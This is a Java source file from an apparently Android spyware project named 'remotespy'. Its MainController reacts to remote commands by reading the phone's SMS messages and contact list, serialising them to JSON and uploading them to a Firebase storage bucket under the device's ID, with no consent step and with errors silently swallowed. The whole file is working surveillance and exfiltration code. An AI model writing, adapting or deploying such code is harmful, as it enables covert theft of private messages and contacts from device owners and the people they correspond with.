package org.dalol.remotespy.controller;

import android.net.Uri;
import android.support.annotation.NonNull;
import android.util.Log;

import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;
import com.google.gson.Gson;

import org.dalol.remotespy.application.MainApplication;
import org.dalol.remotespy.data.Constants;
import org.dalol.remotespy.data.vo.ContactVO;
import org.dalol.remotespy.data.vo.SmsVO;
import org.dalol.remotespy.data.providers.ContactProvider;
import org.dalol.remotespy.data.providers.SmsProvider;
import org.dalol.remotespy.utilities.DeviceUtils;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.Callable;

import io.reactivex.Single;
import io.reactivex.SingleSource;
import io.reactivex.android.schedulers.AndroidSchedulers;
import io.reactivex.functions.Function;
import io.reactivex.functions.Predicate;
import io.reactivex.observers.DisposableMaybeObserver;
import io.reactivex.schedulers.Schedulers;

/**
 * @author Filippo Engidashet
 * @version 1.0.0
 * @since Sun, 01/04/2018 at 12:36.
 */

public class MainController {

    private MainController() {
    }

    public static MainController getInstance() {
        return InstanceHolder.sInstance;
    }

    public void handleBody(String body) {
        if ("contacts".equals(body)) {
            handleContacts();
        } else if ("messages".equals(body)) {
            handleMessages();
        } else {
            handleMessages();
            handleContacts();
        }
    }

    private static final class InstanceHolder {
        private static final MainController sInstance = new MainController();
    }

    public void handleMessages() {
        Single.fromCallable(new Callable<List<SmsVO>>() {
            @Override
            public List<SmsVO> call() throws Exception {
                return new SmsProvider().getData();
            }
        }).flatMap(new Function<List<SmsVO>, SingleSource<byte[]>>() {
            @Override
            public SingleSource<byte[]> apply(List<SmsVO> smsVOS) throws Exception {
                return Single.just(toByte(smsVOS, "app_user_msg.json"));
            }
        }).filter(new Predicate<byte[]>() {
                    @Override
                    public boolean test(byte[] bytes) throws Exception {
                        return bytes.length > 0;
                    }
                })
                .subscribeOn(Schedulers.newThread())
                .observeOn(AndroidSchedulers.mainThread())
                .unsubscribeOn(Schedulers.computation())
                .subscribeWith(new DisposableMaybeObserver<byte[]>() {
                    @Override
                    public void onSuccess(byte[] bytes) {
                        uploadToStorage(bytes, "messages");
                    }

                    @Override
                    public void onError(Throwable e) {
                    }

                    @Override
                    public void onComplete() {

                    }
                });

    }

    public void handleContacts() {
        Single.fromCallable(new Callable<List<ContactVO>>() {
            @Override
            public List<ContactVO> call() throws Exception {
                return new ContactProvider().getData();
            }
        }).flatMap(new Function<List<ContactVO>, SingleSource<byte[]>>() {
            @Override
            public SingleSource<byte[]> apply(List<ContactVO> contactVOS) throws Exception {
                return Single.just(toByte(contactVOS, "app_user_contacts.json"));
            }
        }).filter(new Predicate<byte[]>() {
            @Override
            public boolean test(byte[] bytes) throws Exception {
                return bytes.length > 0;
            }
        })
                .subscribeOn(Schedulers.newThread())
                .observeOn(AndroidSchedulers.mainThread())
                .unsubscribeOn(Schedulers.computation())
                .subscribeWith(new DisposableMaybeObserver<byte[]>() {
                    @Override
                    public void onSuccess(byte[] bytes) {
                        uploadToStorage(bytes, "contacts");
                    }

                    @Override
                    public void onError(Throwable e) {
                    }

                    @Override
                    public void onComplete() {

                    }
                });
    }

    private byte[] toByte(Object object, String fileName) throws IOException {

        String json = new Gson().toJson(object);
        File cacheDir = MainApplication.getContext().getExternalCacheDir();
        if (cacheDir != null) {
            File file = new File(cacheDir.getAbsolutePath() + "/" + fileName);
            BufferedWriter output = new BufferedWriter(new FileWriter(file));

            output.write(json);
            output.close();

            byte[] data = new byte[(int) file.length()];

            FileInputStream fis = new FileInputStream(file);
            int read = fis.read(data);
            fis.close();
            return data;
        }
        return new byte[]{};
    }

    private void uploadToStorage(byte[] data, String fileName) {
        FirebaseStorage storage = FirebaseStorage.getInstance(Constants.FIREBASE_STORAGE_BUCKET_URL);
        StorageReference storageRef = storage.getReference(DeviceUtils.getDeviceId() + "/" + fileName + "/" + getDateString() + ".json");
        UploadTask uploadTask = storageRef.putBytes(data);
        uploadTask.addOnFailureListener(new OnFailureListener() {
            @Override
            public void onFailure(@NonNull Exception exception) {
                exception.printStackTrace();
                // Handle unsuccessful uploads
            }
        }).addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
            @Override
            public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                Log.e("Success", taskSnapshot.toString());
                // taskSnapshot.getMetadata() contains file metadata such as size, content-type, and download URL.
                Uri downloadUrl = taskSnapshot.getDownloadUrl();
            }
        });
    }

    private String getDateString() {
        return new SimpleDateFormat("MMM dd,yyyy HH:mm", Locale.getDefault()).format(new Date(System.currentTimeMillis()));
    }
}
